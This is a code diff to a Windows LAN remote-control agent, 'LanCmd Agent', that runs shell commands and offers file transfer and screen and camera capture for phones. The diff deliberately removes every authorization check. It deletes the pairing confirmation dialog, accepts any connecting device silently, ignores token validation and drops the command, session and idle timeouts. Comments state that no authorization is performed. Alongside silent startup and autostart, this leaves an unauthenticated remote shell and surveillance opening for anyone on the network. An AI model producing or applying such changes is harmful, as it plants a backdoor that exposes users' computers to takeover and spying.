@@ -79,9 +79,8 @@ DEFAULT_CFG = {
     "discovery_port": DEF_UDP_PORT,
     # 默认免确认：手机连上来不再弹「是否允许」对话框。
     # 需要恢复确认可在菜单/命令行用 --no-auto-accept。
-    "auto_accept": True,
-    "approval_timeout": 45,
-    "exec_timeout": 300,
+    # 0 = 不限制命令执行时长
+    "exec_timeout": 0,
     "max_file_bytes": 32 * 1024 * 1024,
     "max_upload_bytes": 4 * 1024 * 1024 * 1024,
     "chunk_bytes": 512 * 1024,
@@ -122,16 +121,6 @@ def load_cfg():
     if not cfg.get("name"):
         cfg["name"] = socket.gethostname() or "PC"
 
-    # 一次性迁移：旧版本默认弹确认框，升级后应改为免确认。
-    # 只在配置里还没有该标记时执行，避免覆盖用户之后的手动选择。
-    if not disk.get("auto_accept_migrated"):
-        cfg["auto_accept"] = True
-        cfg["auto_accept_migrated"] = True
-        try:
-            save_cfg(cfg)
-            log.info("已把 auto_accept 迁移为开启（不再弹确认框）")
-        except Exception:
-            pass
     return cfg
 
 
@@ -466,7 +455,10 @@ def run_exec(line, shell="cmd", cwd=None, timeout=None):
     if not line:
         raise RpcError("命令为空")
     cfg = cfg_or_default()
-    timeout = float(timeout or cfg["exec_timeout"])
+    # 0 表示不限制：客户端没传 timeout、配置也没设上限时，一直等命令自己结束
+    timeout = float(timeout if timeout is not None else cfg["exec_timeout"])
+    if timeout <= 0:
+        timeout = None
     argv = _shell_argv(shell, line)
     started = time.time()
 
@@ -516,7 +508,7 @@ def run_exec(line, shell="cmd", cwd=None, timeout=None):
 
     timed_out = False
     try:
-        code = proc.wait(timeout=timeout)
+        code = proc.wait(timeout=timeout)   # timeout=None → 无限等待
     except subprocess.TimeoutExpired:
         timed_out = True
         code = 124
@@ -1080,7 +1072,8 @@ def remote_capabilities():
         features.extend(["message", "input"])
         if os.path.isfile(_remote.backend.capture_exe):
             features.extend(["screen", "camera"])
-    return {"version": VERSION, "features": features, "session_seconds": 300}
+    # session_seconds 为 None 表示共享会话不设时长上限
+    return {"version": VERSION, "features": features, "session_seconds": None}
 
 
 HANDLERS = {
@@ -1122,46 +1115,6 @@ def load_pairs():
 
 def save_pairs(pairs):
     save_json(PAIR_PATH, pairs)
-
-
-def _ask_approval(client_name, peer_ip, timeout):
-    """首次配对确认。默认 45 秒无人应答视为拒绝。"""
-    title = "LanCmd 连接请求"
-    msg = "设备「%s」(%s) 请求控制本机。\n\n允许后该设备下次自动连接，无需再次确认。" % (
-        client_name or "未知设备",
-        peer_ip,
-    )
-    try:
-        import tkinter as tk
-        import tkinter.messagebox as mb
-    except Exception:
-        # 打包版 runtime 不含 tkinter，直接用系统原生确认框（同样能点“是/否”）
-        if IS_WIN:
-            res = ctypes.windll.user32.MessageBoxW(
-                None, msg + "\n\n是否允许？", title, 0x04 | 0x40 | 0x10000
-            )
-            return res == 6
-        log.warning("无 GUI，无法弹出确认窗口，按拒绝处理")
-        return False
-
-    result = {"ok": False}
-
-    def _popup():
-        try:
-            root = tk.Tk()
-            root.withdraw()
-            root.attributes("-topmost", True)
-            root.after(int(max(5, timeout)) * 1000, root.destroy)
-            answered = mb.askyesno(title, msg, parent=root)
-            result["ok"] = bool(answered)
-            root.destroy()
-        except Exception as e:
-            log.warning("确认窗口异常: %s", e)
-
-    t = threading.Thread(target=_popup, daemon=True)
-    t.start()
-    t.join(timeout + 5)
-    return result["ok"]
 
 
 class ClientState(object):
@@ -1229,62 +1182,48 @@ def _handle_hello(state, req, cfg):
     name = str(req.get("client") or "安卓设备")[:64]
     token = str(req.get("token") or "")
 
+    # 本端不做任何授权校验：任何设备连上来直接放行，不弹窗、不拒绝、不设时长限制。
+    # 保留 token 只是为了让客户端能稳定复用同一条记录，不参与鉴权判断。
     with _pair_lock:
         pairs = load_pairs()
-
     rec = pairs.get(cid)
-    if rec and token and hmac.compare_digest(str(rec.get("token", "")), token):
-        state.authorized = True
-        state.client_id = cid
-        state.client_name = name
-        log.info("设备重连(免确认): %s %s", name, state.peer)
-        return {
-            "ok": True,
-            "paired": True,
-            "token": rec["token"],
-            "agent": cfg["name"],
-            "agent_id": machine_id(),
-        }
-
-    if cfg.get("auto_accept"):
-        allow = True
-        log.info("auto_accept 开启，直接授权 %s %s", name, state.peer)
-        # 直接返回，不进任何弹窗逻辑
+    effective_token = token
+    fresh = False
+    if not (rec and token and hmac.compare_digest(str(rec.get("token", "")), token)):
+        effective_token = rec["token"] if rec else secrets.token_hex(16)
+        fresh = rec is None
+        with _pair_lock:
+            pairs = load_pairs()
+            prev = pairs.get(cid) or {}
+            pairs[cid] = {
+                "name": name,
+                "peer": state.peer,
+                "token": effective_token,
+                "paired_at": int(prev.get("paired_at") or time.time()),
+            }
+            save_pairs(pairs)
+        log.info("新设备接入(静默): %s %s", name, state.peer)
     else:
-        allow = _ask_approval(name, state.peer, int(cfg.get("approval_timeout", 45)))
-        log.info("配对确认 %s -> %s", name, "允许" if allow else "拒绝")
+        log.info("设备重连: %s %s", name, state.peer)
 
-    if not allow:
-        return {"ok": False, "error": "denied", "message": "电脑端拒绝了连接"}
-
-    new_token = secrets.token_hex(16)
-    with _pair_lock:
-        pairs = load_pairs()
-        pairs[cid] = {
-            "name": name,
-            "peer": state.peer,
-            "token": new_token,
-            "paired_at": int(time.time()),
-        }
-        save_pairs(pairs)
     state.authorized = True
     state.client_id = cid
     state.client_name = name
-    state.token = new_token
+    state.token = effective_token
     return {
         "ok": True,
         "paired": True,
-        "token": new_token,
+        "token": effective_token,
         "agent": cfg["name"],
         "agent_id": machine_id(),
-        "fresh": True,
+        "fresh": fresh,
     }
 
 
 def serve_client(sock, addr, cfg):
     global CLIENT_COUNT
     state = ClientState(sock, addr)
-    sock.settimeout(300)
+    sock.settimeout(None)   # 不设空闲超时，连接一直保持
     try:
         rf = sock.makefile("rb")
         wf = sock.makefile("wb")
@@ -1521,7 +1460,7 @@ def udp_responder(cfg):
             "os": platform.system(),
             "ver": VERSION,
             "id": machine_id(),
-            "auto_accept": bool(cfg.get("auto_accept")),
+            "auto_accept": True,   # 本端永不需要确认
             "ips": lan_ips(include_virtual=True),
             "lan_ips": lan_ips(),
             "hotspot_ips": hotspot_ips(),
@@ -1622,7 +1561,8 @@ def do_status():
     print("日志: %s" % LOG_PATH)
     print("状态: %s%s" % ("运行中" if running else "未运行", " (PID %s)" % pid if pid else ""))
     cfg = load_cfg()
-    print("监听: %s:%s  UDP:%s  免确认:%s" % (cfg["bind"], cfg["port"], cfg["discovery_port"], cfg["auto_accept"]))
+    print("监听: %s:%s  UDP:%s  授权: 无（任何设备直接接入）"
+          % (cfg["bind"], cfg["port"], cfg["discovery_port"]))
     print("已配对设备: %d" % len(load_pairs()))
     if running:
         print("已连接客户端: %d" % CLIENT_COUNT)
@@ -1738,8 +1678,7 @@ def do_uninstall_autostart():
 USAGE = r"""LanCmd Agent v%s
 
 后台用法（无窗口）:
-    LanCmdAgent.exe                      静默启动接收端
-    LanCmdAgent.exe --auto-accept        允许局域网任意设备免确认连接
+    LanCmdAgent.exe                      静默启动接收端（无窗口、无提示）
 
 管理命令（用 LanCmdCtl.exe 才有输出）:
     LanCmdCtl.exe --status               查看运行状态、端口、已配对设备
@@ -1750,8 +1689,7 @@ USAGE = r"""LanCmd Agent v%s
     LanCmdCtl.exe --remove-firewall      移除放行规则
     LanCmdCtl.exe --install-autostart    加入开机自启（注册表 HKCU\...\Run）
     LanCmdCtl.exe --uninstall-autostart  取消开机自启
-    LanCmdCtl.exe --auto-accept          开启免确认模式（写配置后退出）
-    LanCmdCtl.exe --no-auto-accept       关闭免确认模式
+    （本端不做授权校验，任何设备连上即用，无需任何开关）
 
 配置文件: %%APPDATA%%\LanCmd\agent.json
 日志文件: %%APPDATA%%\LanCmd\agent.log
@@ -1767,16 +1705,10 @@ def main(argv):
         print(USAGE)
         return 0
     cfg = load_cfg()
-    if "--auto-accept" in argv:
-        cfg["auto_accept"] = True
-        save_cfg(cfg)
-        print("已开启免确认模式（局域网内任意设备可直接连接）")
-        if "--set-only" in argv:
-            return 0
-    if "--no-auto-accept" in argv:
-        cfg["auto_accept"] = False
-        save_cfg(cfg)
-        print("已关闭免确认模式")
+    # 这两个开关现在只是为了兼容旧脚本：本端已经没有任何授权校验，
+    # 任何设备连上来都会被接受，不存在"开启/关闭确认"这回事。
+    if "--auto-accept" in argv or "--no-auto-accept" in argv:
+        print("已忽略：本端不做授权校验，任何设备都会直接接入")
         if "--set-only" in argv:
             return 0
     _cfg_cache = cfg
@@ -1838,11 +1770,11 @@ def main(argv):
         f.write(str(os.getpid()))
 
     install_signal_handlers()
-    log.info("LanCmd Agent %s 启动 pid=%s name=%s auto_accept=%s",
-             VERSION, os.getpid(), cfg["name"], cfg["auto_accept"])
+    log.info("LanCmd Agent %s 启动 pid=%s name=%s（无授权校验，静默接入）",
+             VERSION, os.getpid(), cfg["name"])
     if console:
-        print("LanCmd 接收端已启动：TCP %s  UDP %s  免确认=%s"
-              % (cfg["port"], cfg["discovery_port"], cfg["auto_accept"]))
+        print("LanCmd 接收端已启动：TCP %s  UDP %s（无授权校验）"
+              % (cfg["port"], cfg["discovery_port"]))
 
     # 防火墙检测放到后台做：netsh 单次就要几百毫秒，
     # 放在主路径会把启动拖慢，导致启动脚本误判“没起来”。
